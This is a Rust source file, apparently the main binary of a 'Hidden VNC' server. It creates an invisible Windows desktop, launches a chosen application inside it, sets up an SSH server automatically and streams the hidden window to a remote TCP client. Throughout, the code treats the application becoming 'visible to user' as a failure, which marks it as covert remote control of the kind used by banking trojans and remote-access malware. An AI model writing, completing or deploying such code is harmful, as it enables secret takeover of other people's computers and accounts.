//! Hidden VNC Server Binary
//! 
//! Main entry point for the Hidden VNC server application

use hidden_vnc::{
    common::{ServerConfig, constants::DEFAULT_PORT},
    host::*,
    host::launcher::{launch_app, launch_app_in_desktop},
    Result, HvncError,
};
use winapi::um::{processthreadsapi, handleapi, errhandlingapi, winnt, minwinbase, synchapi};
use std::env;
use std::process;
use std::sync::Arc;
use std::sync::atomic::{AtomicBool, Ordering};
use log::{info, error, warn, debug};
use tokio::signal;
use clap::{Arg, Command};

/// Application configuration
#[derive(Debug, Clone)]
struct AppConfig {
    pub server_config: ServerConfig,
    pub desktop_name: String,
    pub verbose: bool,
    pub daemonize: bool,
}

/// Server lifecycle manager
struct ServerLifecycle {
    desktop: Option<HiddenDesktop>,
    process_id: Option<u32>,
    window_handle: Option<WindowHandle>,
    server: Option<HvncServer>,
    cleanup_handlers: Vec<Box<dyn FnOnce() + Send>>,
}

impl ServerLifecycle {
    fn new() -> Self {
        Self {
            desktop: None,
            process_id: None,
            window_handle: None,
            server: None,
            cleanup_handlers: Vec::new(),
        }
    }
    
    /// Add a cleanup handler
    fn add_cleanup_handler<F>(&mut self, handler: F)
    where
        F: FnOnce() + Send + 'static,
    {
        self.cleanup_handlers.push(Box::new(handler));
    }
    
    /// Set the desktop
    fn set_desktop(&mut self, desktop: HiddenDesktop) {
        self.desktop = Some(desktop);
    }
    
    /// Set the process ID
    fn set_process_id(&mut self, process_id: u32) {
        self.process_id = Some(process_id);
    }
    
    /// Set the window handle
    fn set_window_handle(&mut self, window_handle: WindowHandle) {
        self.window_handle = Some(window_handle);
    }
    
    /// Set the server
    fn set_server(&mut self, server: HvncServer) {
        self.server = Some(server);
    }
    
    /// Get the server reference
    fn server(&mut self) -> Option<&mut HvncServer> {
        self.server.as_mut()
    }
    
    /// Get the window handle
    fn window_handle(&self) -> Option<WindowHandle> {
        self.window_handle
    }
    
    /// Get the process ID
    fn process_id(&self) -> Option<u32> {
        self.process_id
    }
    
    /// Perform graceful cleanup
    fn cleanup(&mut self) {
        info!("Starting server lifecycle cleanup...");
        
        // Shutdown server first
        if let Some(ref server) = self.server {
            info!("Shutting down TCP server...");
            server.shutdown();
        }
        
        // Terminate application process
        if let Some(process_id) = self.process_id {
            info!("Terminating application process {}...", process_id);
            if let Err(e) = terminate_process(process_id) {
                warn!("Failed to terminate process {}: {}", process_id, e);
            }
        }
        
        // Run custom cleanup handlers
        info!("Running {} cleanup handlers...", self.cleanup_handlers.len());
        for handler in self.cleanup_handlers.drain(..) {
            handler();
        }
        
        // Desktop cleanup is handled by Drop trait
        if self.desktop.is_some() {
            info!("Hidden desktop will be cleaned up automatically");
        }
        
        info!("Server lifecycle cleanup completed");
    }
}

impl Drop for ServerLifecycle {
    fn drop(&mut self) {
        if !self.cleanup_handlers.is_empty() || 
           self.server.is_some() || 
           self.process_id.is_some() {
            warn!("ServerLifecycle dropped without explicit cleanup - performing emergency cleanup");
            self.cleanup();
        }
    }
}

impl Default for AppConfig {
    fn default() -> Self {
        Self {
            server_config: ServerConfig::default(),
            desktop_name: "hvnc_desktop".to_string(),
            verbose: false,
            daemonize: false,
        }
    }
}

#[tokio::main]
async fn main() -> Result<()> {
    // Check for administrator privileges first - but don't exit, just warn
    if !is_running_as_admin() {
        warn!("⚠️  RUNNING WITHOUT ADMINISTRATOR PRIVILEGES");
        warn!("Advanced HVNC features may not work properly:");
        warn!("  • Hidden desktop creation may fail");
        warn!("  • Will try to capture from regular desktop instead");
        warn!("  • For full HVNC functionality, run as Administrator");
        warn!("Continuing with fallback mode...");
    }
    // Parse command line arguments
    let config = parse_arguments()?;
    
    // Initialize logging based on verbosity
    init_logging(config.verbose);
    
    info!("Starting Hidden VNC Server v0.1.0");
    info!("Configuration: {:?}", config);
    
    // Set up signal handling for graceful shutdown
    let shutdown_signal = Arc::new(AtomicBool::new(false));
    let shutdown_signal_clone = Arc::clone(&shutdown_signal);
    
    tokio::spawn(async move {
        match signal::ctrl_c().await {
            Ok(()) => {
                info!("Received Ctrl+C, initiating graceful shutdown...");
                shutdown_signal_clone.store(true, Ordering::Relaxed);
            }
            Err(err) => {
                error!("Failed to listen for shutdown signal: {}", err);
            }
        }
    });
    
    // Run the server
    match run_server(config, shutdown_signal).await {
        Ok(()) => {
            info!("Hidden VNC Server shut down successfully");
            Ok(())
        }
        Err(e) => {
            error!("Server error: {}", e);
            process::exit(1);
        }
    }
}

/// Check if the current process is running with administrator privileges
fn is_running_as_admin() -> bool {
    unsafe {
        let mut token_handle: winapi::um::winnt::HANDLE = std::ptr::null_mut();
        
        // Get the access token for the current process
        let result = winapi::um::processthreadsapi::OpenProcessToken(
            winapi::um::processthreadsapi::GetCurrentProcess(),
            winapi::um::winnt::TOKEN_QUERY,
            &mut token_handle,
        );
        
        if result == 0 {
            warn!("Failed to open process token for admin check");
            return false;
        }
        
        // Check if the token has elevated privileges
        let mut elevation: winapi::um::winnt::TOKEN_ELEVATION = std::mem::zeroed();
        let mut return_length: winapi::shared::minwindef::DWORD = 0;
        
        let result = winapi::um::securitybaseapi::GetTokenInformation(
            token_handle,
            winapi::um::winnt::TokenElevation,
            &mut elevation as *mut _ as *mut winapi::ctypes::c_void,
            std::mem::size_of::<winapi::um::winnt::TOKEN_ELEVATION>() as winapi::shared::minwindef::DWORD,
            &mut return_length,
        );
        
        // Clean up the token handle
        winapi::um::handleapi::CloseHandle(token_handle);
        
        if result == 0 {
            warn!("Failed to get token elevation information");
            return false;
        }
        
        elevation.TokenIsElevated != 0
    }
}

/// Parse command line arguments
fn parse_arguments() -> Result<AppConfig> {
    let matches = Command::new("hvnc-server")
        .version("0.1.0")
        .author("Hidden VNC Team")
        .about("Hidden Virtual Network Computing Server")
        .arg(
            Arg::new("application")
                .help("Target application to launch (e.g., notepad.exe)")
                .required(true)
                .index(1)
        )
        .arg(
            Arg::new("bind")
                .short('b')
                .long("bind")
                .value_name("ADDRESS")
                .help("Bind address for the server")
                .default_value("127.0.0.1:5900")
        )
        .arg(
            Arg::new("quality")
                .short('q')
                .long("quality")
                .value_name("QUALITY")
                .help("JPEG quality (1-100)")
                .default_value("80")
        )
        .arg(
            Arg::new("fps")
                .short('f')
                .long("fps")
                .value_name("FPS")
                .help("Target frame rate (1-60)")
                .default_value("30")
        )
        .arg(
            Arg::new("desktop")
                .short('d')
                .long("desktop")
                .value_name("NAME")
                .help("Hidden desktop name")
                .default_value("hvnc_desktop")
        )
        .arg(
            Arg::new("verbose")
                .short('v')
                .long("verbose")
                .help("Enable verbose logging")
                .action(clap::ArgAction::SetTrue)
        )
        .arg(
            Arg::new("daemon")
                .long("daemon")
                .help("Run as daemon (background process)")
                .action(clap::ArgAction::SetTrue)
        )
        .get_matches();
    
    // Parse and validate arguments
    let target_application = matches.get_one::<String>("application")
        .ok_or_else(|| HvncError::Connection("Target application is required".to_string()))?
        .clone();
    
    let bind_address = matches.get_one::<String>("bind")
        .unwrap()
        .clone();
    
    let quality: u8 = matches.get_one::<String>("quality")
        .unwrap()
        .parse()
        .map_err(|_| HvncError::Connection("Invalid quality value".to_string()))?;
    
    if quality < 1 || quality > 100 {
        return Err(HvncError::Connection("Quality must be between 1 and 100".to_string()));
    }
    
    let fps: u32 = matches.get_one::<String>("fps")
        .unwrap()
        .parse()
        .map_err(|_| HvncError::Connection("Invalid FPS value".to_string()))?;
    
    if fps < 1 || fps > 60 {
        return Err(HvncError::Connection("FPS must be between 1 and 60".to_string()));
    }
    
    let frame_rate_ms = 1000 / fps as u64;
    
    let desktop_name = matches.get_one::<String>("desktop")
        .unwrap()
        .clone();
    
    let verbose = matches.get_flag("verbose");
    let daemonize = matches.get_flag("daemon");
    
    let server_config = ServerConfig {
        bind_address,
        target_application,
        jpeg_quality: quality,
        frame_rate_ms,
    };
    
    Ok(AppConfig {
        server_config,
        desktop_name,
        verbose,
        daemonize,
    })
}

/// Initialize logging based on verbosity level
fn init_logging(verbose: bool) {
    let log_level = if verbose {
        "debug"
    } else {
        "info"
    };
    
    env::set_var("RUST_LOG", format!("hvnc_server={},hidden_vnc={}", log_level, log_level));
    env_logger::init();
}

/// Main server execution logic
async fn run_server(config: AppConfig, shutdown_signal: Arc<AtomicBool>) -> Result<()> {
    let mut lifecycle = ServerLifecycle::new();
    
    // Set up panic handler for emergency cleanup
    std::panic::set_hook(Box::new(|panic_info| {
        error!("Server panic occurred: {}", panic_info);
        // Note: Cannot safely access lifecycle from panic handler due to thread safety
    }));
    
    // Initialize server components with proper error handling
    match initialize_server(&config, &mut lifecycle).await {
        Ok(()) => {
            info!("Server initialization completed successfully");
        }
        Err(e) => {
            error!("Server initialization failed: {}", e);
            lifecycle.cleanup();
            return Err(e);
        }
    }
    
    // Run the main server loop
    let result = run_server_loop(&mut lifecycle, shutdown_signal).await;
    
    // Always perform cleanup
    lifecycle.cleanup();
    
    // Reset panic handler
    let _ = std::panic::take_hook();
    
    result
}

/// Initialize server components with improved input handling and no auto-restart
async fn initialize_server(config: &AppConfig, lifecycle: &mut ServerLifecycle) -> Result<()> {
    // Auto-setup SSH server (zero configuration required)
    info!("Setting up SSH server automatically...");
    let mut server = HvncServer::new(config.server_config.clone());
    server.auto_setup()?;
    info!("SSH server setup completed");

    // Try to create hidden desktop - but don't fail if it doesn't work
    info!("Attempting to create hidden desktop: {}", config.desktop_name);
    let desktop_result = create_hidden_desktop(&config.desktop_name);
    
    let (desktop_handle, use_main_desktop) = match desktop_result {
        Ok(desktop) => {
            info!("✅ Hidden desktop created successfully");
            lifecycle.set_desktop(desktop);
            (Some(lifecycle.desktop.as_ref().unwrap().handle()), false)
        }
        Err(e) => {
            warn!("❌ Failed to create hidden desktop: {}", e);
            warn!("📋 Falling back to main desktop mode");
            warn!("   Note: Application will be visible to user");
            (None, true)
        }
    };
    
    // Launch target application
    info!("Launching application: {}", config.server_config.target_application);
    let process_id = if use_main_desktop {
        // Launch on main desktop
        info!("🖥️ Launching on main desktop");
        launch_app(&config.server_config.target_application)?
    } else {
        // Launch on hidden desktop
        info!("🔒 Launching on hidden desktop");
        launch_app_in_desktop(desktop_handle.unwrap(), &config.server_config.target_application)?
    };
    
    info!("Application launched with PID: {}", process_id);
    lifecycle.set_process_id(process_id);
    
    // Wait for application window to appear
    info!("Waiting for application window...");
    
    let window_handle = if use_main_desktop {
        // Look for window on main desktop
        info!("🔍 Searching for window on main desktop");
        match wait_for_window(process_id, 10000).await {
            Ok(window) => {
                info!("✅ Window found on main desktop: {:?}", window);
                window
            }
            Err(e) => {
                error!("❌ Could not find window on main desktop: {}", e);
                return Err(e);
            }
        }
    } else {
        // Look for window on hidden desktop first, fallback to main desktop
        match wait_for_window_in_desktop(desktop_handle.unwrap(), process_id, 10000).await {
            Ok(window_handle) => {
                info!("✅ Application window found in hidden desktop: {:?}", window_handle);
                window_handle
            }
            Err(e) => {
                warn!("⚠️ Could not find application window in hidden desktop: {}", e);
                
                // 🔧 FIX: Try to find the window on the main desktop (maybe it didn't launch in hidden desktop)
                info!("🔄 Searching for window on main desktop as fallback...");
                match wait_for_window(process_id, 5000).await {
                    Ok(main_window_handle) => {
                        warn!("⚠️ Window found on MAIN desktop instead of hidden desktop: {:?}", main_window_handle);
                        warn!("   This means the application launched on main desktop, not hidden desktop.");
                        warn!("   Capture will work but window will be visible to user.");
                        main_window_handle
                    }
                    Err(e2) => {
                        error!("❌ Could not find application window anywhere: Hidden desktop: {}, Main desktop: {}", e, e2);
                        return Err(HvncError::window_not_found(
                            "Application window not found in hidden desktop or main desktop. The application may have failed to start or exited immediately."
                        ));
                    }
                }
            }
        }
    };
    
    lifecycle.set_window_handle(window_handle);
    
    // Start the TCP server (SSH already configured)
    info!("Starting TCP server on {}", config.server_config.bind_address);
    server.start().await?;
    info!("TCP server started successfully");
    lifecycle.set_server(server);
    
    Ok(())
}

/// Main server loop
async fn run_server_loop(lifecycle: &mut ServerLifecycle, shutdown_signal: Arc<AtomicBool>) -> Result<()> {
    let mut health_check_interval = tokio::time::interval(tokio::time::Duration::from_secs(5));
    let mut connection_retry_count = 0;
    let mut loop_count = 0;
    const MAX_CONNECTION_RETRIES: u32 = 3;
    
    loop {
        loop_count += 1;
        
        // Debug: Log every 10 iterations to show loop is running
        if loop_count % 10 == 0 {
            debug!("Main server loop iteration {}", loop_count);
        }
        
        // Check for shutdown signal
        if shutdown_signal.load(Ordering::Relaxed) {
            info!("Shutdown signal received");
            break;
        }
        
        // Get all needed values to avoid borrowing conflicts
        let window_handle = lifecycle.window_handle().ok_or_else(|| {
            HvncError::window_not_found("Window handle not available")
        })?;
        
        let process_id = lifecycle.process_id().ok_or_else(|| {
            HvncError::Connection("Process ID not available".to_string())
        })?;
        
        let desktop_handle = lifecycle.desktop.as_ref().map(|d| d.handle());
        
        let server = lifecycle.server().ok_or_else(|| {
            HvncError::Connection("Server not initialized".to_string())
        })?;
        
        // Handle client connections and sessions
        debug!("Main server loop iteration {} - checking client status", loop_count);
        
        if server.has_client() {
            debug!("Server has client, calling handle_client...");
            
            // Handle existing client session - this should be a persistent session
            // that streams frames until the client disconnects
            match server.handle_client(window_handle, desktop_handle).await {
                Ok(()) => {
                    info!("Client session completed successfully");
                    // Client disconnected normally, continue accepting new connections
                }
                Err(e) => {
                    warn!("Client session error: {}", e);
                    // Disconnect client and continue accepting new connections
                    server.disconnect_client();
                }
            }
        } else {
            debug!("Server has no client, accepting new connections...");
            // Accept new client connections with timeout
            match tokio::time::timeout(
                tokio::time::Duration::from_secs(1), 
                server.accept_single_connection()
            ).await {
                Ok(Ok(())) => {
                    info!("Client connection accepted successfully");
                    connection_retry_count = 0; // Reset retry count on success
                    // Client is now connected - next iteration will handle the session
                    continue;
                }
                Ok(Err(e)) => {
                    error!("Error accepting connection: {}", e);
                    connection_retry_count += 1;
                    
                    if connection_retry_count >= MAX_CONNECTION_RETRIES {
                        error!("Maximum connection retries ({}) exceeded", MAX_CONNECTION_RETRIES);
                        return Err(e);
                    }
                    
                    warn!("Connection retry {}/{}", connection_retry_count, MAX_CONNECTION_RETRIES);
                    tokio::time::sleep(tokio::time::Duration::from_secs(1)).await;
                }
                Err(_) => {
                    // Timeout waiting for connections - this is normal
                    debug!("Connection accept timeout - continuing loop");
                }
            }
        }
        
        // Periodic health check (every few iterations)
        if loop_count % 100 == 0 {
            debug!("Performing health check...");
            
            // Check if application is still running
            if !is_process_running(process_id) {
                warn!("Target application has exited, shutting down server");
                return Err(HvncError::application_not_found(
                    "Target application is no longer running"
                ));
            }
            
            // Check server status
            if server.is_shutdown_requested() {
                info!("Server shutdown requested via internal signal");
                break;
            }
            
            // Log server statistics if client is connected
            if server.has_client() {
                debug!("Server status: Client connected, application running");
            } else {
                debug!("Server status: Waiting for client connection");
            }
        }
        
        // Small delay to prevent busy loop, but more responsive for client handling
        if server.has_client() {
            // When client is connected, sleep very briefly to allow frame processing
            tokio::time::sleep(tokio::time::Duration::from_millis(10)).await;
        } else {
            // When waiting for connections, sleep longer
            tokio::time::sleep(tokio::time::Duration::from_millis(100)).await;
        }
    }
    
    info!("Server loop completed successfully");
    Ok(())
}

/// Wait for application window to appear with timeout
async fn wait_for_window(process_id: u32, timeout_ms: u64) -> Result<WindowHandle> {
    let start_time = std::time::Instant::now();
    let timeout = std::time::Duration::from_millis(timeout_ms);
    
    loop {
        // Try to find any window for this process (using empty pattern matches any window)
        debug!("Attempting to find window for PID {} (attempt at {}ms)", process_id, start_time.elapsed().as_millis());
        match find_window(process_id, "") {
            Ok(window_handle) => {
                info!("Window found for PID {}", process_id);
                return Ok(window_handle);
            }
            Err(e) => {
                debug!("Window search failed for PID {}: {}", process_id, e);
                // Window not found yet, continue waiting
                if start_time.elapsed() > timeout {
                    return Err(HvncError::window_not_found(format!(
                        "Window not found for PID {} within {}ms timeout", 
                        process_id, timeout_ms
                    )));
                }
                
                // Wait a bit before trying again
                tokio::time::sleep(tokio::time::Duration::from_millis(100)).await;
            }
        }
    }
}

/// Wait for application window to appear with timeout in a hidden desktop
async fn wait_for_window_in_desktop(desktop: DesktopHandle, process_id: u32, timeout_ms: u64) -> Result<WindowHandle> {
    let start_time = std::time::Instant::now();
    let timeout = std::time::Duration::from_millis(timeout_ms);
    
    loop {
        // Try to find any window for this process in the hidden desktop (using empty pattern matches any window)
        debug!("Attempting to find window for PID {} in hidden desktop (attempt at {}ms)", process_id, start_time.elapsed().as_millis());
        match find_window_in_desktop(desktop, process_id, "") {
            Ok(window_handle) => {
                info!("Window found for PID {} in hidden desktop", process_id);
                return Ok(window_handle);
            }
            Err(e) => {
                debug!("Window search failed for PID {} in hidden desktop: {}", process_id, e);
                // Window not found yet, continue waiting
                if start_time.elapsed() > timeout {
                    return Err(HvncError::window_not_found(format!(
                        "Window not found for PID {} in hidden desktop within {}ms timeout", 
                        process_id, timeout_ms
                    )));
                }
                
                // Wait a bit before trying again
                tokio::time::sleep(tokio::time::Duration::from_millis(100)).await;
            }
        }
    }
}

/// Check if a process is still running
fn is_process_running(process_id: u32) -> bool {
    unsafe {
        let handle = processthreadsapi::OpenProcess(
            winnt::PROCESS_QUERY_INFORMATION,
            0,
            process_id,
        );
        
        if handle.is_null() {
            debug!("Failed to open process {} for status check", process_id);
            return false;
        }
        
        let mut exit_code: u32 = 0;
        let result = processthreadsapi::GetExitCodeProcess(
            handle,
            &mut exit_code,
        );
        
        handleapi::CloseHandle(handle);
        
        if result == 0 {
            debug!("Failed to get exit code for process {}", process_id);
            return false;
        }
        
        let is_running = exit_code == minwinbase::STILL_ACTIVE;
        debug!("Process {} status: {} (exit code: {})", 
               process_id, 
               if is_running { "running" } else { "terminated" }, 
               exit_code);
        
        is_running
    }
}

#[derive(Debug)]
struct ProcessInfo {
    pid: u32,
    exit_code: u32,
    is_running: bool,
}

/// Get process information for debugging
fn get_process_info(process_id: u32) -> Result<ProcessInfo> {
    
    unsafe {
        let handle = processthreadsapi::OpenProcess(
            winnt::PROCESS_QUERY_INFORMATION,
            0,
            process_id,
        );
        
        if handle.is_null() {
            return Err(HvncError::windows_api(format!(
                "Failed to open process {} for information", process_id
            )));
        }
        
        let mut exit_code: u32 = 0;
        let result = processthreadsapi::GetExitCodeProcess(handle, &mut exit_code);
        handleapi::CloseHandle(handle);
        
        if result == 0 {
            let error_code = errhandlingapi::GetLastError();
            return Err(HvncError::windows_api_with_code(
                "Failed to get process info", error_code
            ));
        }
        
        Ok(ProcessInfo {
            pid: process_id,
            exit_code,
            is_running: exit_code == minwinbase::STILL_ACTIVE,
        })
    }
}

/// Terminate a process gracefully with timeout
fn terminate_process(process_id: u32) -> Result<()> {
    info!("Attempting to terminate process {}", process_id);
    
    // First check if process is still running
    if !is_process_running(process_id) {
        info!("Process {} is already terminated", process_id);
        return Ok(());
    }
    
    unsafe {
        let handle = processthreadsapi::OpenProcess(
            winnt::PROCESS_TERMINATE | winnt::PROCESS_QUERY_INFORMATION,
            0,
            process_id,
        );
        
        if handle.is_null() {
            let error_code = errhandlingapi::GetLastError();
            return Err(HvncError::windows_api_with_code(
                format!("Failed to open process {} for termination", process_id), error_code
            ));
        }
        
        // Try graceful termination first (if it's a GUI application)
        info!("Attempting graceful termination of process {}", process_id);
        let result = processthreadsapi::TerminateProcess(handle, 0);
        
        if result == 0 {
            let error_code = errhandlingapi::GetLastError();
            handleapi::CloseHandle(handle);
            return Err(HvncError::windows_api_with_code(
                format!("Failed to terminate process {}", process_id), error_code
            ));
        }
        
        // Wait for process to actually terminate (with timeout)
        let wait_result = winapi::um::synchapi::WaitForSingleObject(
            handle, 
            5000 // 5 second timeout
        );
        
        handleapi::CloseHandle(handle);
        
        match wait_result {
            winapi::um::winbase::WAIT_OBJECT_0 => {
                info!("Process {} terminated successfully", process_id);
            }
            258 => { // WAIT_TIMEOUT constant value
                warn!("Process {} termination timed out, but terminate signal was sent", process_id);
            }
            _ => {
                warn!("Unexpected wait result for process {} termination", process_id);
            }
        }
    }
    
    Ok(())
}

/// Attempt to restart the application if it crashes
async fn attempt_application_restart(
    config: &AppConfig, 
    lifecycle: &mut ServerLifecycle
) -> Result<()> {
    warn!("Attempting to restart application: {}", config.server_config.target_application);
    
    // Clean up old process reference
    lifecycle.process_id = None;
    lifecycle.window_handle = None;
    
    // Launch application again
    let desktop_handle = lifecycle.desktop.as_ref()
        .ok_or_else(|| HvncError::desktop_creation("desktop", "Desktop not available"))?
        .handle();
    
    let process_id = launch_app_in_desktop(desktop_handle, &config.server_config.target_application)?;
    info!("Application restarted with PID: {}", process_id);
    lifecycle.set_process_id(process_id);
    
    // Wait for window to appear
    let window_handle = wait_for_window(process_id, 10000).await?;
    info!("Application window found after restart");
    lifecycle.set_window_handle(window_handle);
    
    Ok(())
}